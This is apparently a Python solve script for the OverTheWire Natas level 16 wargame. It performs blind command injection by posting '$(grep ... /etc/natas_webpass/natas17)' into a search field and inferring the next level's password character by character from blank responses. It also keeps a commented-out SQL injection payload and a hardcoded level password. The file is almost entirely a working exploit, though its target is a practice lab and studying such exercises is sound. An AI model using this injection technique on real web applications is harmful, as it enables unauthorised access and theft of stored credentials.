import requests
import re

url = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"  # Add updated passwd for Natas16

# Characters to test (alphanumeric + num chars)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Placeholder for the extracted password
extracted_password = "bo7LFNb8vwhHb9s75hokh5TF0OC"

# Loop through each character position
for i in range(1, 33):  # Assuming the password is 32 characters long
    for char in charset:
        # Construct the payload
        # old_payload = f'natas16" AND password LIKE BINARY "{extracted_password}{char}%" -- '
        payload = f'$(grep {char}{extracted_password} /etc/natas_webpass/natas17)'
        data = {"needle": payload}

        # Send the request
        response = requests.post(url, auth=(username, password), data=data)

        # Using Regex to check if the reponse would be blank or not (checking inside the <pre> tag)
        match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)

        # If result is blank, char was a match, otherwise we move onto to next char
        if match and not match.group(1).strip():  # Check if <pre> tag is empty
            extracted_password=char + extracted_password
            print("Exptracted Password : %s" % extracted_password)
            break

        '''
        if {char} in response.text:
            extracted_password += char
            print(f"Extracted: {extracted_password}")
            break
        '''

print(f"Final password: {extracted_password}")